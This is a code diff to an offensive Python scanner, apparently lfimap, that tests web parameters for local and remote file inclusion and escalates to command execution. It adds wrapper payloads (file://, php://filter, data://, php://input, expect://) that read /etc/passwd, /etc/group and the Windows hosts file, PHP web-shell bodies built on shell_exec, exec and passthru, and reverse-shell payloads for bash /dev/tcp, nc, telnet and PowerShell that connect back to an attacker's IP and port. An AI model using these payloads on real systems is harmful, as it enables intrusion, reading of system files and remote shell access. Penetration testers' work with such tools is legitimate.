@@ -31,7 +31,7 @@ def serve_forever():
     with socketserver.TCPServer(("", 80), ServerHandler) as httpd:
 
         if(args.verbose):
-            print("[i] Opening local web server and setting up 'rfitest.txt' that will be used as test inclusion")
+            print("[i] Opening local web server on port 80 and setting up 'rfitest.txt' that will be used as test inclusion")
 
         tempf = open("rfitest.txt", "w")
         tempf.write("961bb08a95dbc34397248d92352da799")
@@ -93,7 +93,14 @@ def test_file_wrapper(url):
     
     testL = []
     testL.append("file:///etc/passwd")
-    testL.append("file/etc/passwd")
+    testL.append("file:///etc/passwd%00")
+    testL.append("file%3A%2F%2F%2Fetc%2Fpasswd")
+    testL.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
+    testL.append("file:///etc/group")
+    testL.append("file:///etc/group%00")
+    testL.append("file%3A%2F%2F%2Fetc%2Fgroup")
+    testL.append("file%3A%2F%2F%2Fetc%2Fgroup%2500")
+    testL.append("///etc/passwd%00")
 
     for i in range(len(testL)):
         u = url.replace(args.param, testL[i])
@@ -142,7 +149,8 @@ def test_trunc(url):
             if(args.verbose): print("Testing /proc/self/environ inclusion via User-Agent")
             test_self_environ(url)
 
-    
+
+#TODO check this function
 def test_self_environ(url):
     testL = []
     testL.append("/proc/self/environ&cmd=cat%20/etc/passwd")
@@ -161,19 +169,32 @@ def test_self_environ(url):
                 continue
             else: break
 
+
 def test_php_filter(url):
     if(args.verbose):
         print("Testing PHP filter wrapper ...")
 
     testL = []
     testL.append("php://filter/resource=/etc/passwd")
+    testL.append("php://filter/resource=/etc/passwd%00")
     testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
+    testL.append("php://filter/convert.base64-encode/resource=/etc/passwd%00")
     testL.append("php://filter/read=string.rot13/resource=/etc/passwd")
-    
+    testL.append("php://filter/read=string.rot13/resource=/etc/passwd%00")
+    testL.append("php://filter/resource=/etc/group")
+    testL.append("php://filter/resource=/etc/group%00")
+    testL.append("php://filter/convert.base64-encode/resource=/etc/group")
+    testL.append("php://filter/convert.base64-encode/resource=/etc/group%00")
+    testL.append("php://filter/read=string.rot13/resource=/etc/group")
+    testL.append("php://filter/read=string.rot13/resource=/etc/group%00")
+        
     testW = []
     testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
+    testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts%00")
     testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
+    testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts%00")
     testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
+    testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts%00")
     
     #Linux
     for i in range(len(testL)):
@@ -184,7 +205,10 @@ def test_php_filter(url):
             res = requests.get(u, headers = headers, proxies = proxies)
             
             if(checkPayload(res)):
+                
+                #TODO
                 tempUrl = u.replace('/etc/passwd', 'CMD')
+                
                 getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
                 print("[+] LFI -> " + u)
                 
@@ -223,6 +247,7 @@ def test_php_data(url):
 
     testL = []
     testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
+    testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/group")
 
     testW = []
     testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
@@ -235,7 +260,10 @@ def test_php_data(url):
             res = requests.get(u, headers = headers, proxies = proxies)
         
             if(checkPayload(res)):
+                
+                #TODO
                 tempUrl = u.replace('cat%20/etc/passwd', 'CMD')
+                
                 getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
                 print("[+] RCE -> " + u)
                 if(args.no_stop):
@@ -274,13 +302,15 @@ def test_php_input(url):
 
     testL = []
     testL.append("php://input&cmd=cat%20/etc/passwd")
-    
+    testL.append("php://input&cmd=cat%20/etc/group")
+
     testW = []
     testW.append("php://input&cmd=ipconfig")
     
     posts = []
-    posts.append("<?php echo shell_exec($_GET['cmd']) ?>")
-    posts.append("<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>")
+    posts.append("<?php echo shell_exec($_GET['cmd']);?>")
+    posts.append("<? echo exec($_GET['cmd']);?>")
+    posts.append("<?php echo passthru($_GET['cmd']);?>")
     
     #Linux
     for i in range(len(testL)):
@@ -296,9 +326,15 @@ def test_php_input(url):
                 if(checkPayload(res)):
                     print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
                     os = 'LINUX'
+
+                    #TODO
                     tempUrl = u.replace('cat%20/etc/passwd', 'CMD')
+                   
                     getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', os)
-                    break
+                    
+                    if(not args.no_stop):
+                        return
+
             
             except Exception as e:
                 print("Unknown problem occurred: ")
@@ -332,10 +368,11 @@ def test_php_expect(url):
             print("Testing PHP expect wrapper ...")
 
     testL = []
-    testL.append("expect://cat%20%2Fetc%2Fpasswd")
-    
+    testL.append("expect:%2F%2Fcat%20%2Fetc%2Fpasswd")
+    testL.append("expect:%2F%2Fcat%20%2Fetc%2Fgroup")
+
     testW = []
-    testW.append("expect://ipconfig")
+    testW.append("expect:%2F%2Fipconfig")
 
     #Linux
     for i in range(len(testL)):
@@ -346,7 +383,10 @@ def test_php_expect(url):
             res = requests.get(u, headers = headers, proxies = proxies)
         
             if(checkPayload(res)):
+
+                #TODO
                 tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'CMD')
+                
                 getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
                 print("[+] RCE -> " + u)
                 break
@@ -391,23 +431,23 @@ def test_rfi(url):
             if(checkPayload(res)):
                 getExploit(res, 'GET', 'RFI', url.replace(args.param, 'CMD'), '', headers, 'RFI', '')
                 print("[+] RFI -> "+ u)
+                if(not args.no_stop): return
         except:
             pass
-    else:
-        if(args.verbose):
-            print("[i] Trying to include 'https://google.com'. If target has no access to internet use '--lhost' parameter for local RFI test")
+    
+    if(args.verbose):
+         print("[i] Trying to include remote site 'https://www.google.com'...") 
 
     #Internet RFI test
-    if(args.param in url):
-        pyld = "https%3a//www.google.com/"
-        u = url.replace(args.param, pyld)
+    pyld = "https%3a//www.google.com/"
+    u = url.replace(args.param, pyld)
     try:
         res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
+    
         if(checkPayload(res)):
             tempUrl = u.replace(pyld, 'CMD')
             getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
             print("[+] RFI -> " + u)
-
     except:
         pass
 
@@ -417,10 +457,12 @@ def test_rfi(url):
 #Checks if sent payload is executed, key word check in response
 def checkPayload(webResponse):
     KEY_WORDS = ["root:x:0:0", "www-data:",
-                "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
-                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
+                "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG",
+                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
                 "; for 16-bit app support", "sample HOSTS file used by Microsoft",
+                "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2", 
                 "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
+                "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x",
                 "window.google=", "961bb08a95dbc34397248d92352da799"]
@@ -451,13 +493,19 @@ def exploit(exploits, method):
         
     bashPayload =   "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
     ncPayload =     "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
-    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
+    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))
         
-    powershellPayload =  "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.80.129',99)%3b$stream+%3d+$client."\
+    #TODO:powershellPayload Fix
+    powershellPayload =  "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('{IP}',{PORT})%3b$stream+%3d+$client."\
                          "GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data"\
                          "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                          "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
-                         ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\""
+                         ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\" "
+    
+    powershellPayload = powershellPayload.replace("{IP}", ip)
+    powershellPayload = powershellPayload.replace("{PORT}", str(port))
+
+    print("Pyld: " + powershellPayload)
 
     for i in range(len(exploits)):
         exploit = exploits[i]
@@ -765,8 +813,8 @@ def main():
         test_php_data(url)
         test_php_expect(url)
         test_rfi(url)
-    print("Done.")
 
+    print("Done.")
     lfimap_cleanup()
 
 if(__name__ == "__main__"):
@@ -810,14 +858,12 @@ if(__name__ == "__main__"):
     agent = args.agent
     referer = args.referer
     
-    if(args.test_all):
+    if(args.test_all or args.rfi):
         if(os.getuid() != 0):
-            print("[-] Please run lfimap as admin/root for all tests. Exiting...")
+            print("[-] Please run lfimap as admin/root for RFI test. Exiting...")
             sys.exit()
-    elif(args.lhost):
-        if(os.getuid() != 0):
-            print("[-] Cannot run RFI test as non admin user. Please run lfimap as admin/root. Exiting...")
-            sys.exit()
+        if(not args.lhost):
+            print("[!] Warning: lfimap will try to test RFI using remote site. If target is in your network, try to also specify '--lhost' parameter")
 
     urlRegex = re.compile(
 
